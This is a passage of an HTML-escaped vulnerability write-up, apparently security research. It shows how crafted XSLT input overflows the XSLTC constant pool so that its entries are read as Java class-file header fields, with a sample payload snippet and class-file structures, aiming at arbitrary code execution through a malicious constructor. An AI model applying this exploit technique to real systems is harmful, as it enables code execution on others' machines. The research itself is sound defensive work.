style=\"color: #ff9900; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span style=\"color: #9900ff; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;fields_count&lt;/span&gt;&lt;span style=\"color: #ff9900; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: magenta; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;methods_count&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;ol style=\"margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;\"&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: decimal; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;We craft a XSLT input that results in 0x10703 constants in the pool. This will result in a truncated pool size of 0x703 and the start of the constant at index 0x703 (due to 0 based indexing) will be interpreted as &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;access_flags&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: decimal; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;During compilation of the input, we trigger the addition of a new string constant when the pool has 0x702 constants. This will first create a CONSTANT_Utf8 entry at index 0x702 and a CONSTANT_String entry at 0x703. The String entry will reference the preceding Utf8 constant so its value will be the tag byte 0x08 followed by the index 0x07 0x02. This results in an usable access_flags value of 0x0807.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: decimal; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Add a CONSTANT_Double entry at index 0x704. Its 0x06 tag byte will be interpreted as part of the &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;this_class&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; field. The following 2 bytes can then be used to control the value of the &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;super_class&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; field. By setting the next 4 bytes to 0x00, we create an empty interface and fields arrays, before setting the last two bytes to the number of methods we want to define.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The only remaining requirement is that we need to add a CONSTANT_Class entry at index 0x206 of the constant pool, which is relatively straightforward.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The snippet below shows part of the generated XSLT input that will overwrite the first header fields. After filling the constant pool with a large number of string constants for the attribute fields and values, the CONST_STRING entry for the `jEb` element ends up at index 0x703. The XSLT function call to the `ceiling` function then triggers the addition of a controlled CONST_DOUBLE entry at index 0x704:&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;div align=\"left\" dir=\"ltr\" style=\"margin-left: 0pt;\"&gt;&lt;table style=\"border-collapse: collapse; border: none;\"&gt;&lt;colgroup&gt;&lt;/colgroup&gt;&lt;tbody&gt;&lt;tr style=\"height: 0pt;\"&gt;&lt;td style=\"background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;jse jsf='jsg' … jDL&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;'jDM'&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; jDN&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;'jDO'&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; jDP&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;'jDQ'&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; jDR&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;'jDS'&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; jDT&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;'jDU'&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; jDV&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;'jDW'&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; jDX&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;'jDY'&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; jDZ&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;'jEa'&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;/&amp;gt;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;jEb &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;/&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;xsl&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;:&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;value&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;-&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;of &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;select&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;'ceiling(&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008344026969402015&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;)'&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;/&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;We constructed the initial header fields and are now in the interesting part of the class file definition: The methods table. This is where all methods of a class and their bytecode is defined. After XSLTC generates a Java class, the XSLT runtime will load the class and instantiate an object, so the easiest way to achieve arbitrary code execution is to create a malicious constructor. Let’s take a look at the methods table to see how we can define a working constructor:&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;div align=\"left\" dir=\"ltr\" style=\"margin-left: 0pt;\"&gt;&lt;table style=\"border-collapse: collapse; border: none;\"&gt;&lt;colgroup&gt;&lt;/colgroup&gt;&lt;tbody&gt;&lt;tr style=\"height: 0pt;\"&gt;&lt;td style=\"background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;ClassFile&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;[...]&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; methods_count&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;method_info&amp;nbsp; &amp;nbsp; methods&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;[&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;methods_count&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;[...]&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;method_info &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; access_flags&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; name_index&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; descriptor_index&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; attributes_count&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;attribute_info attributes&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;[&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;attributes_count&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;attribute_info &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 attribute_name_index&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u4 attribute_length&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u1 info&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;[&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;attribute_length&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 